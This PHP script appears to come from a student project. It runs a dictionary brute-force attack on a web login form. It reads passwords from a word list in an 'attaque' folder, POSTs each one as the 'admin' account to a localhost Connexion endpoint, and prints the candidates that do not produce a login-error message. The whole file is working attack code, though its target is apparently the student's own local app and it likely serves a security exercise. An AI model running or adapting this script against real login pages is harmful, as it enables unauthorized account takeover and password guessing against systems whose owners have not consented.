<?php
$objetRequete = curl_init();
curl_setopt($objetRequete, CURLOPT_URL,'http://localhost/Fichier_sprint/Fichiers_sprint_10/index.php?vue=Connexion&action=Verification');
curl_setopt($objetRequete, CURLOPT_RETURNTRANSFER, true);
curl_setopt($objetRequete, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($objetRequete, CURLOPT_NOPROXY, '*');
$fichier = fopen("C:\wamp64\www\Fichier_sprint\Fichiers_sprint_10\attaque\listeMDP.txt", "r");
if ($fichier)
{
    while (($motDePasseCourant = fgets($fichier)) !== false)
    {
        $chaineParametre = 'role=1&login=admin&pwd='.rtrim($motDePasseCourant).'';
        curl_setopt($objetRequete, CURLOPT_POSTFIELDS, $chaineParametre);
        $response = curl_exec($objetRequete);
        // $redirectionURL = curl_getinfo($objetRequete, CURLINFO_EFFECTIVE_URL);

        if(curl_error($objetRequete))
        {
            trigger_error('Curl Error' . curl_error($objetRequete));
        }

        if(!strpos($response, 'Erreur de connexion'))
        {
            echo "mot de passe possible : ".rtrim($motDePasseCourant)."\n";
        }
    }
fclose(($fichier));
}
else 
{
    echo "erreur à l'ouverture du fichier";
}
curl_close($objetRequete);

?>
